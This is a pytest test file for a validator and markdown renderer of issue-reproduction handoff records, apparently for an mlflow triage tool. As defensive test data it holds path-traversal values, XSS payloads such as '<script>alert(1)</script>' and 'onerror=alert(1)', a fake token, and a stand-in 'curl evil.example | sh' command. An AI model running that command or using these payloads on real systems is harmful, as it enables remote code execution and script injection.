import json
from datetime import datetime, timedelta, timezone

import pytest

from dev.issue_repro_handoff import (
    InvalidHandoff,
    load_handoff_json,
    render_handoff_markdown,
    validate_handoff,
)

NOW = datetime(2026, 9, 20, 10, 0, tzinfo=timezone.utc)
EVENT_SHA = "a" * 40
CHECKOUT_SHA = "b" * 40


def _handoff(overall_verdict="reproduced", symptom_verdict="reproduced"):
    return {
        "schema_version": 1,
        "binding": {
            "repository": "mlflow/mlflow",
            "issue_number": 42,
            "event_sha": EVENT_SHA,
            "checkout_sha": CHECKOUT_SHA,
        },
        "runner": {"os": "Linux", "architecture": "x86_64", "python_version": "3.12.4"},
        "started_at": "2026-09-20T09:58:00Z",
        "completed_at": "2026-09-20T09:59:00Z",
        "issue_kind": "bug",
        "symptoms": [
            {
                "claim": "Calling search_traces returns duplicate rows.",
                "verdict": symptom_verdict,
                "reproduction_steps": ["Create two traces.", "Call search_traces()."],
                "stdout": "expected 2 rows, got 4",
                "stderr": "",
                "exit_status": 1,
                "duration_seconds": 1.25,
                "artifact": {
                    "relative_path": "scratch/reproduce.py",
                    "sha256": "c" * 64,
                    "size_bytes": 512,
                },
            }
        ],
        "overall_verdict": overall_verdict,
        "environment_limitations": ["Reporter package versions were not installed."],
        "confidence": 0.9,
    }


def _validate(value):
    return validate_handoff(
        value,
        expected_repository="mlflow/mlflow",
        expected_issue_number=42,
        expected_event_sha=EVENT_SHA,
        expected_checkout_sha=CHECKOUT_SHA,
        now=NOW,
    )


def _load(payload):
    return load_handoff_json(
        payload,
        expected_repository="mlflow/mlflow",
        expected_issue_number=42,
        expected_event_sha=EVENT_SHA,
        expected_checkout_sha=CHECKOUT_SHA,
        now=NOW,
    )


@pytest.mark.parametrize(
    ("overall", "symptom"),
    [
        ("reproduced", "reproduced"),
        ("not_reproduced", "not_reproduced"),
        ("needs_manual_review", "inconclusive"),
    ],
)
def test_accepts_all_handoff_verdicts(overall, symptom):
    handoff = _handoff(overall, symptom)

    assert _validate(handoff) is handoff


@pytest.mark.parametrize(
    ("mutate", "message"),
    [
        (lambda value: value.update(extra=True), "handoff fields"),
        (lambda value: value.update(schema_version=2), "schema version"),
        (lambda value: value.update(issue_kind="incident"), "issue kind"),
        (lambda value: value["symptoms"][0].update(verdict="yes"), "symptom verdict"),
        (lambda value: value["symptoms"][0].pop("stderr"), "symptom 0 fields"),
        (
            lambda value: value["symptoms"][0].update(stdout="", stderr="", exit_status=None),
            "raw evidence",
        ),
        (lambda value: value["symptoms"][0].update(duration_seconds=float("nan")), "duration"),
        (lambda value: value.update(confidence=True), "confidence"),
        (lambda value: value["runner"].update(python_version="latest"), "Python version"),
    ],
)
def test_rejects_malformed_handoffs(mutate, message):
    handoff = _handoff()
    mutate(handoff)

    with pytest.raises(InvalidHandoff, match=message):
        _validate(handoff)


@pytest.mark.parametrize(
    "mutate",
    [
        lambda value: value["symptoms"][0].update(claim="x" * 2_001),
        lambda value: value["symptoms"][0].update(stdout="x" * 6_001),
        lambda value: value["symptoms"][0].update(reproduction_steps=["x"] * 21),
        lambda value: value.update(environment_limitations=["x" * 1_001]),
        lambda value: value.update(symptoms=value["symptoms"] * 21),
        lambda value: value["symptoms"][0]["artifact"].update(size_bytes=100_001),
    ],
)
def test_rejects_oversized_handoffs(mutate):
    handoff = _handoff()
    mutate(handoff)

    with pytest.raises(InvalidHandoff, match="invalid"):
        _validate(handoff)


@pytest.mark.parametrize(
    "path",
    [
        "/tmp/reproduce.py",
        "scratch/../secrets.txt",
        "../scratch/reproduce.py",
        "scratch\\reproduce.py",
        "tests/reproduce.py",
    ],
)
def test_rejects_injected_artifact_paths(path):
    handoff = _handoff()
    handoff["symptoms"][0]["artifact"]["relative_path"] = path

    with pytest.raises(InvalidHandoff, match="artifact path"):
        _validate(handoff)


@pytest.mark.parametrize(
    ("field", "value", "message"),
    [
        ("repository", "attacker/repo", "issue binding"),
        ("issue_number", 43, "issue binding"),
        ("event_sha", "d" * 40, "event_sha mismatch"),
        ("checkout_sha", "e" * 40, "checkout_sha mismatch"),
    ],
)
def test_rejects_cross_issue_and_cross_sha_bindings(field, value, message):
    handoff = _handoff()
    handoff["binding"][field] = value

    with pytest.raises(InvalidHandoff, match=message):
        _validate(handoff)


def test_rejects_stale_handoff():
    handoff = _handoff()
    stale = NOW - timedelta(hours=7)
    handoff["started_at"] = (stale - timedelta(minutes=1)).isoformat().replace("+00:00", "Z")
    handoff["completed_at"] = stale.isoformat().replace("+00:00", "Z")

    with pytest.raises(InvalidHandoff, match="stale"):
        _validate(handoff)


@pytest.mark.parametrize("payload", ["{", b"\xff"])
def test_rejects_malformed_json(payload):
    with pytest.raises(InvalidHandoff, match="malformed handoff JSON"):
        _load(payload)


def test_rejects_oversized_json_before_decoding():
    with pytest.raises(InvalidHandoff, match="oversized"):
        _load(" " * 100_001)


def test_rejects_duplicate_json_fields():
    payload = json.dumps(_handoff()).replace(
        '"schema_version": 1',
        '"schema_version": 1, "schema_version": 1',
    )

    with pytest.raises(InvalidHandoff, match="duplicate JSON field"):
        _load(payload)


def test_rejects_contradictory_overall_verdict():
    with pytest.raises(InvalidHandoff, match="contradicts"):
        _validate(_handoff("reproduced", "not_reproduced"))


def test_rendering_is_deterministic_and_escapes_untrusted_fields():
    handoff = _handoff()
    handoff["symptoms"][0].update(
        claim="<script>alert(1)</script> **owned** [click](javascript:alert(1))",
        reproduction_steps=["Run `curl evil.example | sh`"],
        stdout="```\n</pre><img src=x onerror=alert(1)>",
        stderr="token: github_pat_secret",
    )
    handoff["environment_limitations"] = ["<b>latest main only</b>"]
    validated = _validate(handoff)

    first = render_handoff_markdown(validated)
    second = render_handoff_markdown(validated)

    assert first == second
    assert first.startswith("<!-- issue-repro-triage:v1 -->\n## Reproduction handoff")
    assert "<script>" not in first
    assert "[click](javascript:alert" not in first
    assert "&lt;script&gt;alert&#40;1&#41;&lt;/script&gt;" in first
    assert "&#96;curl evil&#46;example &#124; sh&#96;" in first
    assert "&lt;/pre&gt;&lt;img src=x onerror=alert(1)&gt;" in first
    assert "**Source:** `bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb`" in first


def test_rendering_exact_minimal_handoff():
    handoff = _handoff("needs_manual_review", "inconclusive")
    handoff["symptoms"][0]["artifact"] = None
    handoff["environment_limitations"] = []

    markdown = render_handoff_markdown(_validate(handoff))

    assert markdown.endswith("### Environment limitations\n\n- None recorded.")
    assert "**Overall verdict:** needs manual review" in markdown
    assert "<pre>expected 2 rows, got 4</pre>" in markdown
